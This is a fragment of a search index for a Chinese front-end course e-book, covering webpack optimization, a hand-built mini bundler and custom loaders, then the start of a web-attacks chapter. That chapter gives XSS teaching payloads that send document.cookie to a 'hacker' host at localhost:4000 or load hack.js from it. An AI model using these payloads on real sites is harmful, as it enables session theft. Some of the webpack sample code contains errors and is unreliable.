<pre><code>const happyThreadPool = HappyPack.ThreadPool({size: os.cpus().length});\n\nrules: [\n  {\n    test: /\\.css$/,\n    exclude: /node_modules/,\n    use: [\n      {\n        // loader \u5bf9\u5e94\u4e00\u4e2a ID\n        loader: \"happypack/loader?id=css\"\n      }\n    ]\n  },\n]\n\nplugins: [\n  new HappyPack({\n    id: 'css',\n    loaders: ['style-loader', 'css-loader'],\n  })\n]\n</code></pre>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#hardsource","title":"HardSource \u4f18\u5316","text":"<p>\u5728 webpack5 \u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 HardSourceWebpackPlugin \u4f18\u5316\uff08\u786c\u4ef6\u4f18\u5316\uff09\u914d\u7f6e\u7b80\u5355</p> <p>\u53ef\u4ee5\u63d0\u4f9b\u4e2d\u95f4\u7f13\u5b58\uff0c\u4e8c\u6b21\u6784\u5efa\u65f6\u95f4\u7f29\u77ed</p> <pre><code>const HardSourceWebpackPlugin = require('hard-source-webpack-plugin');\n\nconst plugins = [\n  new HardSourceWebpackPlugin(),\n];\n</code></pre>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#dll","title":"DLL \u4f18\u5316","text":"<p>Dll \u662f\u52a8\u6001\u94fe\u63a5\u5e93\uff08\u5b9e\u9645\u4e0a\u5c31\u662f\u7f13\u5b58\uff09</p> <p>\u53ef\u4ee5\u628a\u4e00\u90e8\u5206\u7a33\u5b9a\u7684\u7b2c\u4e09\u65b9\uff08react\uff09\u4f9d\u8d56\u5355\u72ec\u6253\u5305\uff0c\u7136\u540e\u63d0\u9ad8\u6253\u5305\u901f\u5ea6\u3002\u5982\u679c\u9700\u8981\u5bfc\u5165\u7684\u6a21\u5757\u5b58\u5728\u4e8e dll \u4e2d\uff0c\u5c31\u4e0d\u9700\u8981\u518d\u6b21\u6253\u5305\u8fd9\u4e2a\u6a21\u5757\uff0c\u76f4\u63a5\u4ece dll \u4e2d\u83b7\u53d6\u5373\u53ef\u3002</p> <p>\u5b9e\u9645\u4e0a\u662f\u505a\u7f13\u5b58\uff0c\u4f1a\u63d0\u5347 webpack \u6253\u5305\u7684\u901f\u5ea6\uff0c\u4e0d\u4f1a\u51cf\u5c11\u6784\u5efa\u540e\u7684\u4ee3\u7801\u4f53\u79ef\u3002</p> <p>\u4f7f\u7528\u4e24\u4e2a\u63d2\u4ef6</p> <p>dllPlugin: \u7528\u4e8e\u6253\u5305\u51fa\u5355\u72ec\u7684 DLL \u6587\u4ef6</p> <p>DllReferencePlugin: \u7528\u4e8e\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5f15\u5165 DLLPlugin \u63d2\u4ef6\u6253\u5305\u597d\u7684 DLL \u6587\u4ef6</p> <p>webpack \u901a\u8fc7 DllReferencePlugin \u83b7\u53d6 react \u6709\u54ea\u4e9b\u5bf9\u5e94\u7684\u6587\u4ef6\uff0cdll-plugin \u53ef\u4ee5\u751f\u6210 dll \u52a8\u6001\u5e93\u6587\u4ef6\u3002\u4e0b\u6b21\u6784\u5efa\u65f6\uff0c\u68c0\u67e5\u4f9d\u8d56\uff0c\u5982\u679c\u6709\u5bf9\u5e94\u7684 dll \u6587\u4ef6\uff0c\u4e0d\u9700\u8981\u91cd\u65b0\u6784\u5efa\uff0c\u51cf\u5c11\u6784\u5efa\u65f6\u95f4\u3002</p> <pre><code>new webpack.DllReferencePlugin({\n  manifest: path.resolve(__dirname, \"./dll/react-manifest.json\")\n}),\nnew DllPlugin({\n  path: path.join(__dirname, \"./dll\", \"[name]-manifest.json\"),\n  name: \"react\",\n}),\n</code></pre> <p>Manifest.json \u63cf\u8ff0\u4e86\u5bf9\u5e94\u7684 dll \u5305\u62ec\u4e86\u54ea\u4e9b\u6a21\u5757\uff0cID \u548c\u8def\u5f84\u3002</p> <p>\u7136\u540e\u5728 HTML \u4e2d\u9700\u8981\u628a DLL \u6587\u4ef6\u5bfc\u5165.</p>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#_1","title":"\u5206\u6790\u6253\u5305\u540e\u7684\u6a21\u5757\u5173\u7cfb","text":"<p>Webpack-bundle-analyzer</p> <pre><code>npm install -D webpack-bundle-analyzer\n</code></pre> <pre><code>const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin.\n\nplugins: [\n  new BundleAnalyzerPlugin(),\n]\n</code></pre>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#_2","title":"\u5206\u6790\u6253\u5305\u65f6\u95f4","text":"<p>\u53ef\u4ee5\u5206\u6790\u4e0d\u540c\u6253\u5305\u8fc7\u7a0b\u7684\u4f9d\u8d56\u65f6\u95f4</p> <p>Speed-measure-webpack-plugin</p> <pre><code>const SpeedMeasurePlugin = require(\"speed-measure-webpack-plugin\");\nconst smp = new SpeedMeasurePlugin();\n\nconst config = {};\n\nmodule.exports = smp.wrap(config);\n</code></pre>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#_3","title":"\u4f5c\u7528\u57df\u63d0\u5347","text":"<p>\u5206\u6790\u6a21\u5757\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u5c3d\u91cf\u628a\u6a21\u5757\u653e\u5728\u540c\u4e00\u4e2a\u51fd\u6570\u4e2d</p> <pre><code>optimization: {\n  concatenateModules: true,\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#_4","title":"\u4f18\u5316\u5b9e\u4f8b","text":"<p>\u4f18\u5316\u524d\u7684\u65f6\u95f4\u6d88\u8017</p> <pre><code> SMP  \nGeneral output time took 48.86 secs\n\n SMP  Plugins\nTerserPlugin took 0.249 secs\n\n SMP  Loaders\nbabel-loader took 39.008 secs\nmodules with no loaders took 35.55 secs\ncss-loader took 18.89 secs\nurl-loader took 3.008 secs\nstyle-loader, and css-loader took 0.101 secs\n\nHash: 4bc99a3d86b94b976911\nVersion: webpack 4.29.6\nTime: 48862ms\nBuilt at: 2021/11/01 \u4e0a\u534810:27:27\n</code></pre> <p>\u6253\u5305\u65f6\u95f4\u4e3a 48s</p> <p>\u53ef\u4ee5\u53d1\u73b0\u4e3b\u8981\u7684\u8017\u65f6\u5728 babel-loader css-loader </p> <p>\u4f18\u5316\u540e\uff0c\u4f7f\u7528\u591a\u7ebf\u7a0b\u6253\u5305\uff08\u4ece 49 \u4f18\u5316\u5230 41\u79d2\uff0c\u53ef\u80fd\u662f\u7535\u8111\u6027\u80fd\uff0c\u6216\u8005\u53ea\u4f18\u5316\u4e86\u4e00\u90e8\u5206\u4ee3\u7801\uff0c\u4e00\u90e8\u5206 with no loaders\uff09</p> <pre><code> SMP  \nGeneral output time took 40.76 secs\n\n SMP  Plugins\nHappyPlugin took 0.148 secs\nTerserPlugin took 0.143 secs\n\n SMP  Loaders\nhappypack took 36.9 secs\nmodules with no loaders took 20.73 secs\ncss-loader took 0.914 secs\nurl-loader took 0.799 secs\n\nHash: 4bc99a3d86b94b976911\nVersion: webpack 4.29.6\nTime: 40908ms\nBuilt at: 2021/11/01 \u4e0a\u534810:42:14\n</code></pre> <p>\u4f7f\u7528\u786c\u4ef6\u52a0\u901f\u540e\uff0c\u53ef\u80fd\u548c\u5df2\u6709\u7684\u63d2\u4ef6\u51b2\u7a81\uff0c\u53cd\u800c\u65f6\u95f4\u66f4\u957f\u4e86\uff0c\u6240\u4ee5\u4e0d\u4f7f\u7528\u8fd9\u4e2a\u63d2\u4ef6</p> <p>https://www.npmjs.com/package/hard-source-webpack-plugin</p>"},{"location":"ebook-kaikeba-frontend/18-webpack-06/","title":"18-webpack-06","text":""},{"location":"ebook-kaikeba-frontend/18-webpack-06/#webpack","title":"webpack \u7b2c\u516d\u8282","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 7173  \u9605\u8bfb15\u5206\u949f</p> <p>2021-10-31</p>"},{"location":"ebook-kaikeba-frontend/18-webpack-06/#webpack_1","title":"webpack \u6784\u5efa\u57fa\u672c\u539f\u7406","text":"<p>\u5b9e\u9645\u4e0a\u6253\u5305\u540e\u7684\u6587\u4ef6 bundle \u5c31\u662f\u4e00\u4e2a\u81ea\u6267\u884c\u51fd\u6570\u3002</p> <p>\u51fd\u6570\u7684\u524d\u534a\u90e8\u5206\u662f\u542f\u52a8\u5668\uff08\u63cf\u8ff0\u4e0d\u540c\u6a21\u5757\u7684\u4f9d\u8d56\u5173\u7cfb\uff09</p> <pre><code>(function (modules) {\n  var installedModules = {};\n  // \u5b9a\u4e49\u4e00\u4e2a\u5185\u7f6e\u7684 require \u51fd\u6570\uff0c\u66ff\u6362\u539f\u6765\u7684\u5bfc\u5165\u6a21\u5757\n  function __webpack_require__(moduleId) {\n    if (installedModules[moduleId]) {\n      return installedModules[moduleId].exports;\n    }\n    var module = (installedModules[moduleId] = {\n      i: moduleId,\n      1: false,\n      exports: {}\n    });\n    modules[moduleId].call(\n        module.exports,\n      module,\n      module.exports,\n      __webpack_require__\n    );\n    module.1 = true;\n    return module.exports;\n  }\n}\nreturn __webpack_require__((__webpack_require__.s = \"./index.js\"));\n// ...\n)\n</code></pre> <p>\u51fd\u6570\u7684\u540e\u534a\u90e8\u5206\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u952e\u662f\u6a21\u5757\u7684\u8def\u5f84\uff0c\u503c\u662f\u6a21\u5757\u7684\u5177\u4f53\u4ee3\u7801\u3002</p> <pre><code>{\n  \"./a.js\": function(module, exports) {\n    eval(\n     '// import a from \"./a\";\\n\\nconsole.log(\"hello\")\\n\\n//#sourceURL=webpack:///./index.js?'\n    );\n  }\n}\n</code></pre> <p>webpack \u5b9e\u73b0\u4e86 <code>__webpack_require__</code> \u7684\u5185\u90e8\u51fd\u6570\u5b9e\u73b0\u6a21\u5757\u5316\uff0c\u628a\u4ee3\u7801\u7f13\u5b58\u5230 installedModules \u4e2d\u3002\u4ee3\u7801\u5185\u90e8\u7684 require \u88ab\u66ff\u6362\u6210 <code>__webpack_require__</code></p> <p>\u7136\u540e webpack \u901a\u8fc7 import \u627e\u51fa\u4e0d\u540c\u6a21\u5757\u7684\u4f9d\u8d56\u5173\u7cfb\uff08\u4f9d\u8d56\u6811\uff09\u5e76\u8fdb\u884c\u6784\u5efa\u8f6c\u6362</p> <p>loader \u662f\u5bf9\u4e0d\u540c\u6811\u8282\u70b9\u7684\u5904\u7406\uff1bplugin \u662f\u7edf\u4e00\u5bf9\u6811\u8282\u70b9\u505a\u5904\u7406\uff08\u4f8b\u5982\u6447\u6811\uff09</p>"},{"location":"ebook-kaikeba-frontend/18-webpack-06/#webpack_2","title":"\u7b80\u5355\u5b9e\u73b0\u4e00\u4e2a webpack","text":"<p>webpack \u6784\u5efa\u8fc7\u7a0b</p> <ol> <li>\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\uff08\u9700\u8981\u914d\u7f6e\u5165\u53e3\u548c\u51fa\u53e3\uff09</li> <li>\u5206\u6790\u6a21\u5757\u4f9d\u8d56\u5173\u7cfb</li> <li>\u901a\u8fc7 fs \u8bfb\u53d6\u6587\u4ef6\uff0c\u901a\u8fc7 babel.parser \u8fdb\u884c\u8bed\u6cd5\u89e3\u6790\uff0c\u8f6c\u6362\u6210 AST\uff0c\u5206\u6790\u5185\u5bb9</li> <li>\u83b7\u53d6\u4f9d\u8d56\u5173\u7cfb\u548c\u6e90\u7801\uff0c\u628a\u6e90\u7801\u7f16\u8bd1\u8f6c\u6362\u6210\u53ef\u4ee5\u6267\u884c\u7684\u4ee3\u7801</li> <li>\u4ece\u5165\u53e3\u6587\u4ef6\u9012\u5f52\u904d\u5386\u5168\u90e8\u6a21\u5757\u6267\u884c 1-2</li> <li>\u628a AST \u8f6c\u6362\u6210\u5bf9\u8c61\uff08\u952e\u662f\u6587\u4ef6\u8def\u5f84\uff0c\u503c\u662f\u5904\u7406\u597d\u7684\u4ee3\u7801\u5185\u5bb9\uff09</li> <li>\u521b\u5efa bundle.js\uff0c\u589e\u52a0\u542f\u52a8\u5668\u51fd\u6570\uff0c\u5904\u7406 module exports require\uff0c\u6d4f\u89c8\u5668\u53ef\u4ee5\u6267\u884c</li> </ol> <pre><code>// bundle.js(\u6d4f\u89c8\u5668\u76f4\u63a5\u89e3\u6790)\nconst options = require(\"./webpack.config.js\");\nconst Webpack = require(\"./lib/webpack.js\");\n\nnew Webpack(options).run();\n</code></pre> <p>\u6211\u4eec\u81ea\u5df1\u5199\u4e00\u4e2a webpack</p> <p>\u9700\u8981 babel \u5e93\uff08\u8bcd\u6cd5\u89e3\u6790\u8bed\u6cd5\u89e3\u6790\uff1b\u8f6c\u6362 AST\uff09</p> <pre><code>npm install @babel/parser @babel/traverse --save\n</code></pre> <pre><code>const fs = require(\"fs\");\nconst path = require(\"path\");\nconst parser = require(\"@babel/parser\");\nconst traverse = require(\"@babel/traverse\").default;\n\nmodule.exports = class Webpack {\n  // \u5c06\u53d8\u91cf\u5b58\u653e\u5728\u6784\u9020\u5668\u4e2d\n  constructor(options) {\n    const { entry, output } = options;\n    this.entry = entry;\n    this.output = output;\n  }\n\n  run() {\n    const info = this.parse(this.entry);\n    this.modules.push(info);\n    // \u5faa\u73af\u65f6\uff0c\u59cb\u7ec8\u5f80 this.modules \u4e2d push\uff0c\u5b9e\u73b0\u5e7f\u5ea6\u4f18\u5148\u904d\u5386\n    for (let i = 0; i &lt; this.modules.length; i++) {\n      const item = this.modules[i];\n      const { dependencies } = item;\n      if (dependencies) {\n        // \u9012\u5f52\u8f6c\u6362\u4f9d\u8d56\u7684\u6a21\u5757\n        for (let j in dependencies) {\n          this.modules.push(this.parse(dependencies[j]));\n        }\n      }\n    }\n    const obj = {};\n    this.modules.forEach(item =&gt; {\n        obj[item.entryFile] = {\n        dependencies: item.dependencies,\n        code: item.code,\n      };\n    });\n    console.log(this.modules);\n  }\n\n  parse(entryFilePath) {\n    // \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\n    const content = fs.readFileSync(entryFilePath, \"utf-8\");\n\n    // \u8bcd\u6cd5\u89e3\u6790\u6210 AST\n    const ast = parser.parse(content, {\n      sourceType: \"module\"\n    });\n\n    // \u8def\u5f84\u8f6c\u6362\uff08AST\u8282\u70b9\u5206\u6210\u4e24\u7c7b\uff0c\u4e00\u79cd\u662f\u5bfc\u5165\u7684\u8282\u70b9\uff0c\u4e00\u79cd\u662f\u4ee3\u7801\u5185\u5bb9\u8282\u70b9\uff09\n    traverse(ast, {\n      // \u5904\u7406\u5bfc\u5165\u58f0\u660e\u7684\u8282\u70b9\n      ImportDeclaration({ node }) {\n        // \u6211\u4eec\u9700\u8981\u628a\u6a21\u5757\u4e2d\u7684\u76f8\u5bf9\u8def\u5f84\uff0c\u8f6c\u6362\u6210\u6839\u8def\u5f84\u7684\u76f8\u5bf9\u8def\u5f84\n        // './utils.js' =&gt; './src/utils.js'\n        // \u5c31\u662f\u628a\u5165\u53e3\u6587\u4ef6\u7684\u8def\u5f84\u548c\u6a21\u5757\u7684\u76f8\u5bf9\u8def\u5f84\u62fc\u5728\u4e00\u8d77\uff0c\u4f7f\u7528 path.join \u5373\u53ef\n        const newPathName = path.join(\n            path.dirname(entryFile),\n          node.source.value\n        );\n        // \u5c06\u8def\u5f84\u7684\u5bf9\u5e94\u5173\u7cfb\u5199\u5165\u5bf9\u8c61\n        dependencies[node.source.value] = newPathName;\n      },\n    });\n\n        // \u5f02\u6b65\u5904\u7406\n    transformFromAst(ast, null, {\n      presets: [\"@babel/preset-env\"],\n    });\n\n    return {\n      entryFile,\n      dependencies,\n      code,\n    }\n  }\n\n  // \u5904\u7406 require module exports\n  // main.js =&gt; dist/main.js\n  file(code) {\n    const filePath = path.join(this.output,path, this.output.xxx)\n    const newCode = JSON.stringify(code);\n    const bundle = `\n            (function(graph) {\n                function require(module) {\n                    function reRequire(relativePath) {\n                        graph[module].dependencies[relativePath];\n          }\n                    var exports = {}\n                    (function(code) {\n                        eval(code); \n            })(reRequire, exports, graph[module].code);\n                    return exports;\n        }\n                require('${this.entry}');\n      })(${newCode});\n        `;\n    fs.writeFileSync(filePath, bundle, \"utf-8\");\n  }\n}\n</code></pre> <p>\u8fd9\u91cc\u8f6c\u6362\u6587\u6863\u5728 babel \u5b98\u7f51\u4e0a\u6709\u4ecb\u7ecd</p> <p>transformFromAst \u57fa\u672c\u7528\u6cd5</p> <pre><code>const parsedAst = babel.parse(sourceCode, {\n  parserOpts: allowReturnOutsideFunction: true\n});\nbabel.transformAst(parsedAst, sourceCode, options, {\n  function(err, result) {\n    const { code, map, ast } = result;\n  }\n});\n</code></pre> <p>\u9700\u8981\u628a\u4ee3\u7801\u8f6c\u6362\u6210\u6d4f\u89c8\u5668\u53ef\u4ee5\u8bc6\u522b\u7684\uff0c\u9700\u8981 babel/core and babel/preset-env</p> <pre><code>const babel = require(\"@babel/core\");\n\nconst { code } = babel.transformFromAst(Ast, null, {\n  presets: [\"@babel/preset-env\"]\n});\n</code></pre>"},{"location":"ebook-kaikeba-frontend/18-webpack-06/#loader","title":"\u81ea\u5b9a\u4e49 loader","text":"<p>\u5728 webpack \u4e0a\u9762\u6709\u5177\u4f53\u7684\u7f16\u5199 loader \u6216\u8005 plugin \u7684\u6559\u7a0b</p> <p>loader \u662f\u4e00\u4e2a\u58f0\u660e\u5f0f\u51fd\u6570\uff08\u4e0d\u80fd\u7528\u7bad\u5934\u51fd\u6570\uff09\uff1b\u9700\u8981\u83b7\u53d6\u5bf9\u8c61\uff0c\u5904\u7406\u540e\u5e76\u8fd4\u56de\uff08\u539f\u5730\u7b97\u6cd5\uff09</p> <pre><code>module.exports = function(obj) {\n  // \u4e00\u5b9a\u8981\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\uff08\u591a\u4e2aloader\u6709\u987a\u5e8f\uff09\n  return obj.replace('hello', 'hi');\n}\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7 query\u5c5e\u6027\u83b7\u53d6 loader \u914d\u7f6e\u6587\u4ef6\u7684\u4f20\u53c2</p> <p>\u6700\u597d\u4f7f\u7528\u5b98\u65b9\u7ed9\u51fa\u7684 this.callback \u51fd\u6570\uff0c\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61</p> <pre><code>const loaderUtils = require(\"loader-utils\");\n\nmodule.exports = function(source) {\n  const options = loaderUtils.getOptions(this);\n  const result = source.replace('hello', 'hi');\n  this.callback(null, result);\n}\n</code></pre> <pre><code>this.callback(\n    err: Error | null,\n  contemt: string | Buffer,\n  sourceMap?: SourceMap,\n  meta?: any\n);\n</code></pre> <p>\u5982\u679c\u662f\u81ea\u5b9a\u4e49\u7684loader\uff0c\u9700\u8981\u5728 webpack \u914d\u7f6e\u8def\u5f84</p> <pre><code>resolveLoader: {\n  modules: [\"node_modules\", \"./loader\"],\n}\n\nrules: [\n  {\n    test: /\\.js$/,\n    use: [\n      \"replaceLoader\",\n      {\n        loader: \"replaceLoaderAsync\",\n        options: {\n          name: \"all\"\n        }\n      }\n    ]\n  }\n]\n</code></pre> <p>\u5982\u679c\u662f style-loader</p> <pre><code>module.exports = function(source) {\n  return `\n        const ele = document.createElement('style');\n        ele.innerHtml = ${JSON.stringify(source)};\n        document.head.appendChild(ele);\n    `;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/18-webpack-06/#plugin","title":"\u81ea\u5b9a\u4e49 plugin","text":"<p>\u6bd4 loader \u590d\u6742\uff0c\u5728\u5b98\u7f51\u4e0a\u4e5f\u53ef\u4ee5\u627e\u5230</p> <p>\uff08plugin\u662f\u4e00\u4e2a\u7c7b\uff0c\u9700\u8981\u5305\u542b apply \u51fd\u6570\uff0c\u63a5\u53d7\u53c2\u6570 compiler\uff09</p> <p>\u4e8b\u4ef6\u9a71\u52a8\uff0c\u53d1\u5e03\u8ba2\u9605</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/","title":"\u5e38\u89c1Web\u653b\u51fb","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 15049  \u9605\u8bfb31\u5206\u949f</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#_1","title":"\u8bfe\u5802\u2f6c\u6807","text":"<p>\u638c\u63e1XSS (\u5b9e\u65bd + \u9632\u5fa1) </p> <p>\u638c\u63e1CSRF (\u5b9e\u65bd + \u9632\u5fa1) </p> <p>\u638c\u63e1\u70b9\u51fb\u52ab\u6301 (\u5b9e\u65bd + \u9632\u5fa1) </p> <p>\u638c\u63e1SQL\u6ce8\u2f0a (\u5b9e\u65bd + \u9632\u5fa1) </p> <p>\u638c\u63e1OS\u6ce8\u2f0a (\u5b9e\u65bd + \u9632\u5fa1) </p> <p>\u4e86\u89e3\u8bf7\u6c42\u52ab\u6301</p> <p>\u4e86\u89e3DDOS</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#_2","title":"\u77e5\u8bc6\u8981\u70b9","text":""},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#1xss","title":"1\u3001XSS","text":"<p>XSS \u653b\u51fb\u7684\u57fa\u672c\u903b\u8f91\uff1a\u5728 URL \u4e2d\u63d2\u5165\u4e00\u6bb5 script \u811a\u672c\uff0c\u7136\u540e\u811a\u672c\u7684 src \u8bbe\u7f6e\u6210\u53e6\u4e00\u4e2a\u7f51\u5740\uff08\u9ed1\u5ba2\u7f51\u5740\uff09\u6216\u8005\u8bbe\u7f6e\u4e00\u6bb5 JS \u4ee3\u7801\uff0c\u7136\u540e\u63d2\u5165\u4e00\u5f20\u56fe\u7247\uff0c\u56fe\u7247\u7684 src \u4e2d\u5305\u62ec\u5f53\u524d\u7528\u6237\u7684\u767b\u5f55\u4fe1\u606f\uff08document.cookie\uff09\u8fd9\u6837\u5728\u9ed1\u5ba2\u5e73\u53f0\u4e0a\u53ef\u4ee5\u83b7\u53d6\u5230\u7528\u6237\u7684 cookie\uff0c\u7136\u540e\u53ef\u4ee5\u76f4\u63a5\u767b\u5f55\u7528\u6237\u7684\u8d26\u6237\u3002\u56fe\u7247\u901a\u5e38\u4f1a\u52a0\u8f7d\uff0c\u6240\u4ee5\u5199\u5165\u56fe\u7247\u7684 src \u4e2d\u3002 <code>&lt;img src=\"http://localhost:4000?test:${document.cookie}\"/&gt;</code> \u7c7b\u4f3c\u8fd9\u6837\u7684\u811a\u672c\u3002</p> <p>\u9ed1\u5ba2\u53d1\u7ed9\u522b\u4eba\u4e00\u4e2a\u7f51\u5740\uff0c\u7136\u540e\u70b9\u51fb\u7f51\u5740\u8fdb\u5165\u7684\u754c\u9762\u4e2d\uff0c\u5c31\u53ef\u80fd\u6709\u975e\u6cd5\u7684\u811a\u672c\u3002</p> <p>Cross Site Scripting \u8de8\u7ad9\u811a\u672c\u653b\u51fb</p> <p>XSS (Cross-Site Scripting)\uff0c\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff0c\u56e0\u4e3a\u7f29\u5199\u548c CSS\u91cd\u53e0\uff0c\u6240\u4ee5\u53ea\u80fd\u53eb XSS\u3002\u8de8\u7ad9\u811a\u672c\u653b \u51fb\u662f\u6307\u901a\u8fc7\u5b58\u5728\u5b89\u5168\u6f0f\uf94e\u6d1e\ufa05\u7684Web\u2f79\u7f51\u7ad9\u6ce8\u518c\u2f64\u6237\u7684\u6d4f\u89c8\u5668\ufa38\u5185\u8fd0\u2f8f\u2fae\u975e\u6cd5\u7684\u2fae\u975e\u672c\u7ad9\u70b9HTML\u6807\u7b7e\u6216 JavaScript\u8fdb\u2f8f\u7684\u2f00\u4e00\u79cd\u653b\u51fb\u3002</p> <pre><code>var img = new Image();\nimg.src = 'http://localhost:4000/img?c=' + document.cookie;\n</code></pre> <p>\u52a0\u5165\u8fd9\u6bb5\u4ee3\u7801\u540e\uff0c\u4f1a\u5c06\u6d4f\u89c8\u5668\u7684 cookie \u83b7\u53d6\u5230\uff0c\u7136\u540e\u56fe\u7247\u4f1a\u8bf7\u6c42 4000 \u7aef\u53e3\uff08\u9ed1\u5ba2\u7aef\u53e3\uff09\u53ef\u4ee5\u89e3\u6790\u4e00\u4e0b\u83b7\u53d6\u5230 cookie\uff0c\u9ed1\u5ba2\u5c31\u53ef\u4ee5\u8fdb\u884c\u6b63\u5e38\u7684\u767b\u5f55\u4e86</p> <pre><code>localhost:3000/?from=&lt;script%20src=\"http://localhost:4000/hack.js\"&gt;&lt;/script&gt;\n</code></pre> <p>\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u6709\u53ef\u80fd\u9020\u6210\u4ee5\u4e0b\u5f71\u54cd:</p> <p>\u5229\uf9dd\u2f64\u865a\u5047\u8f93\u2f0a\u8868\u5355\u9a97\u53d6\u2f64\u6237\u4e2a\u2f08\u4eba\u4fe1\u606f\u3002</p> <p>\uf9dd\u2f64\u811a\u672c\u7a83\u53d6\u2f64\u6237\u7684Cookie\u503c\uff0c\u88ab\u5bb3\u8005\u5728\uf967\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u5e2e\u52a9\u653b\u51fb\u8005\u53d1\u9001\u6076\u610f\u8bf7\u6c42\u3002</p> <p>\u663e\u793a\u4f2a\u9020\u7684\u2f42\u7ae0\u6216\u56fe\u7247\u3002</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#xss","title":"XSS\u653b\u51fb\u5206\u7c7b","text":"<ul> <li>\u53cd\u5c04\u578b - url\u53c2\u6570\u76f4\u63a5\u6ce8\u2f0a\uff08\u653b\u51fb\u4e00\u4e2a\u7528\u6237\u7684\u8d26\u6237\uff09</li> </ul> <pre><code>// \u666e\u901a\nhttp://localhost:3000/?from=china\n\n// alert\u5c1d\u8bd5\nhttp://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt;\n\n// \u83b7\u53d6Cookie\nhttp://localhost:3000/?from=&lt;script src=\"http://localhost:4000/hack.js\"&gt; &lt;/script&gt;\n\n// \u77ed\u57df\u540d\u4f2a\u9020(\u7528\u6237\u65e0\u6cd5\u76f4\u63a5\u770b\u6e05\u695a\u539f\u6765\u7684\u957f\u7f51\u7ad9\u4e2d\u662f\u5426\u6709 script \u6807\u7b7e)\nhttps://dwz.cn/console/operation \u767e\u5ea6\u968f\u4fbf\u641c\u7d22\u5c31\u6709\n\n// \u4f2a\u9020 cookie \u2f0a\u4fb5 chrome \ndocument.cookie=\"kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUz NTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0=\"\n</code></pre> <ul> <li>\u5b58\u50a8\u578b \uff08\u76f4\u63a5\u653b\u51fb\u6570\u636e\u5e93\uff0c\u7136\u540e\u5176\u4ed6\u4eba\u6267\u884c\u65f6\u4f1a\u76f4\u63a5\u53d1\u5e03\uff09 \u9ed1\u5ba2\u8f93\u5165\u4e00\u4e2a\u542b\u6709\u75c5\u6bd2\u7684\u8bc4\u8bba\uff0c\u5b58\u50a8\u5230DB\u540e\uff0c\u5176\u4ed6\u6b63\u5e38\u7528\u6237\u8bfb\u53d6\u65f6\u4e2d\u6bd2\uff0c\u83b7\u53d6\u7528\u6237\u7684\u6d4f\u89c8\u5668 cookie\uff0c\u7136\u540e\u7ee7\u7eed\u4f20\u64ad</li> </ul> <pre><code>// \u8bc4\u8bba\n&lt;script&gt;alert(1)&lt;/script&gt;\n\n// \u8de8\u7ad9\u811a\u672c\u6ce8\u2f0a\n\u6211\u6765\u4e86&lt;script src=\"http://localhost:4000/hack.js\"&gt;&lt;/script&gt;\n</code></pre>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#xss-scripting","title":"XSS\u653b\u51fb\u7684\u5371\u5bb3 - Scripting\u80fd\u5e72\u5565\u5c31\u80fd\u5e72\u5565","text":"<p>\u83b7\u53d6\u2eda\u9762\u6570\u636e \u83b7\u53d6Cookies \u52ab\u6301\u524d\u7aef\u903b\u8f91</p> <p>\u53d1\u9001\u8bf7\u6c42</p> <p>\u5077\u53d6\u7f51\u7ad9\u7684\u4efb\u610f\u6570\u636e</p> <p>\u5077\u53d6\u2f64\u6237\u7684\u8d44\u6599</p> <p>\u5077\u53d6\u2f64\u6237\u7684\u79d8\u5bc6\u548c\u767b\u5f55\u6001</p> <p>\u6b3a\u9a97\u2f64\u6237</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#xss_1","title":"XSS \u9632\u8303\u2f3f\u6bb5","text":""},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#head","title":"HEAD","text":"<p>0 \u7981\u6b62XSS\u8fc7\u6ee4</p> <p>1 